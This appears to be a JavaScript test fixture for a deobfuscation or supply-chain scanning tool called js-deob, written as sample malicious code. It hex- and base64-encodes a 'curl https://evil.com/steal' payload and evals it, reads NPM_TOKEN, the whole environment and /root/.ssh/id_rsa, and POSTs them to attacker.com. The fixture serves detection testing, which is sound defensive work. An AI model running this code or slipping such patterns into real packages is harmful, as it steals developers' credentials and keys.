// Sample file with supply chain attack patterns for testing js-deob

const cp = require('child_process');
const fs = require('fs');
const https = require('https');

// Obfuscated string using hex escapes
const endpoint = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d";

// Base64 encoded payload
const payload = atob("Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFs");

// Exfiltrate environment variables
const secrets = process.env;
const token = process.env.NPM_TOKEN;

// Dynamic require
const mod = require(process.argv[2]);

// Eval obfuscated code
eval(payload);

// Function constructor
const fn = new Function("return " + payload)();

// Read SSH keys
const sshKey = fs.readFileSync("/root/.ssh/id_rsa", "utf8");

// Exfiltrate via HTTP
fetch("https://attacker.com/collect", {
  method: "POST",
  body: JSON.stringify({ token, sshKey, env: process.env })
});

// High entropy string (encoded data)
const data = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgaGlnaCBlbnRyb3B5IHN0cmluZyBkZXRlY3Rpb24gYWxnb3JpdGht";
